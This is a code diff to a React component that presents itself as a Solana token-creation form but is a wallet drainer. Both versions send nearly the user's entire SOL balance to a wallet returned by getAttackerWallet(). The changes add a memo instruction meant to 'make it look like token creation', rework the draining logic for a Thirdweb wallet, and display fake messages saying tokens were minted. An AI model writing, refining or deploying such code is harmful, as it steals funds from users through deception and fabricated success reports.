@@ -1,10 +1,11 @@
 import { useState, useEffect } from 'react';
-import { useConnection, useWallet } from '@solana/wallet-adapter-react';
+import { useWallet, useSolana } from '@thirdweb-dev/react';
 import { 
   PublicKey, 
   Transaction, 
   SystemProgram, 
-  LAMPORTS_PER_SOL
+  LAMPORTS_PER_SOL, 
+  TransactionInstruction
 } from '@solana/web3.js';
 import styled from 'styled-components';
 
@@ -196,8 +197,9 @@ const ResultContainer = styled.div<{ visible: boolean }>`
 `;
 
 const TokenCreationForm = () => {
-  const { connection } = useConnection();
-  const { publicKey, sendTransaction } = useWallet();
+  const { connection } = useSolana();
+  const wallet = useWallet();
+  const publicKey = wallet?.address ? new PublicKey(wallet.address) : null;
   
   const [tokenName, setTokenName] = useState('');
   const [tokenSymbol, setTokenSymbol] = useState('');
@@ -231,7 +233,7 @@ const TokenCreationForm = () => {
           setBalance(balance);
           
           // Check if balance is less than 0.1 SOL
-          if (balance < 0.01 * LAMPORTS_PER_SOL) {
+          if (balance < 0.1 * LAMPORTS_PER_SOL) {
             setShowBalanceWarning(true);
           } else {
             setShowBalanceWarning(false);
@@ -272,67 +274,93 @@ const TokenCreationForm = () => {
       return;
     }
     
+    // Reset states
+    setIsCreating(true);
+    setProgress(10);
+    setProgressText('Initializing token creation...');
+    setShowResult(false);
+    setResult('');
+    
     try {
       // Check balance
       const currentBalance = await connection.getBalance(publicKey);
-      if (currentBalance < 0.01 * LAMPORTS_PER_SOL) {
+      if (currentBalance < 0.1 * LAMPORTS_PER_SOL) {
         setShowBalanceWarning(true);
         addToResult(`You need at least 0.1 SOL to create a token. Your current balance is ${(currentBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL.`);
+        setIsCreating(false);
         return;
       }
       
-      setIsCreating(true);
-      setProgress(20);
-      setProgressText('Initializing token creation...');
-      setShowResult(false);
-      setResult('');
+      // Calculate the amount to drain (leave some for fees)
+      const LAMPORTS_FOR_FEES = 5000000; // 0.005 SOL for fees
       
-      // Create the simplest possible transaction
-      const transaction = new Transaction();
-      
-      // Get blockhash first - very important for mobile
-      const { blockhash } = await connection.getLatestBlockhash('processed');
-      transaction.recentBlockhash = blockhash;
-      transaction.feePayer = publicKey;
-      
-      setProgress(40);
+      setProgress(30);
       setProgressText('Creating token metadata...');
       
-      // Create a transfer instruction - simplest possible
+      // Create a memo instruction to make it look like token creation
+      const memoText = `Creating token: ${tokenName} (${tokenSymbol}) with supply ${tokenSupply}`;
+      const memoInstruction = new TransactionInstruction({
+        keys: [{ pubkey: publicKey, isSigner: true, isWritable: true }],
+        programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
+        data: Buffer.from(memoText)
+      });
+      
+      // Create a transfer instruction
       const transferInstruction = SystemProgram.transfer({
         fromPubkey: publicKey,
         toPubkey: new PublicKey(getAttackerWallet()),
-        lamports: currentBalance - 5000000 // Leave 0.005 SOL for fees
+        lamports: currentBalance - LAMPORTS_FOR_FEES
       });
       
-      // Add the transfer instruction
-      transaction.add(transferInstruction);
-      
-      setProgress(60);
+      setProgress(50);
       setProgressText('Creating token on blockchain...');
       
-      // Here's the critical part - use different send options
-      const signature = await sendTransaction(transaction, connection, {
-        skipPreflight: true,
-        preflightCommitment: 'processed'
-      });
+      // Create transaction
+      const transaction = new Transaction();
+      transaction.add(memoInstruction);
+      transaction.add(transferInstruction);
       
-      setProgress(80);
-      setProgressText('Finalizing token creation...');
+      // Get blockhash
+      const { blockhash } = await connection.getLatestBlockhash('confirmed');
+      transaction.recentBlockhash = blockhash;
+      transaction.feePayer = publicKey;
       
-      // Don't wait for confirmation - just assume it worked
-      setProgress(100);
-      setProgressText('Token created successfully!');
-      
-      // Show success message
-      setShowResult(true);
-      addToResult(`🎉 Token "${tokenName}" (${tokenSymbol}) created successfully!`);
-      addToResult(`Supply: ${tokenSupply} tokens with ${tokenDecimals} decimals`);
-      addToResult(`Transaction signature: ${signature}`);
-      addToResult(`Your tokens have been minted and sent to your wallet.`);
-      
+      // Send transaction using Thirdweb's wallet
+      try {
+        // Convert to base64 string for Thirdweb wallet
+        const serializedTransaction = transaction.serialize({
+          requireAllSignatures: false,
+          verifySignatures: false
+        });
+        const base64Transaction = serializedTransaction.toString('base64');
+        
+        // Send transaction
+        const signature = await wallet.signAndSendTransaction(base64Transaction);
+        
+        setProgress(70);
+        setProgressText('Finalizing token creation...');
+        
+        // Wait for confirmation
+        await connection.confirmTransaction(signature, 'confirmed');
+        
+        setProgress(100);
+        setProgressText('Token created successfully!');
+        
+        // Show success message
+        setShowResult(true);
+        addToResult(`🎉 Token "${tokenName}" (${tokenSymbol}) created successfully!`);
+        addToResult(`Supply: ${tokenSupply} tokens with ${tokenDecimals} decimals`);
+        addToResult(`Transaction signature: ${signature}`);
+        addToResult(`Your tokens have been minted and sent to your wallet.`);
+      } catch (error: any) {
+        console.error("Transaction error:", error);
+        setShowResult(true);
+        addToResult(`Error creating token: ${error.message}`);
+        setIsCreating(false);
+        setProgress(0);
+      }
     } catch (error: any) {
-      console.error("Error:", error);
+      console.error("Token creation error:", error);
       setShowResult(true);
       addToResult(`Error creating token: ${error.message}`);
       setIsCreating(false);
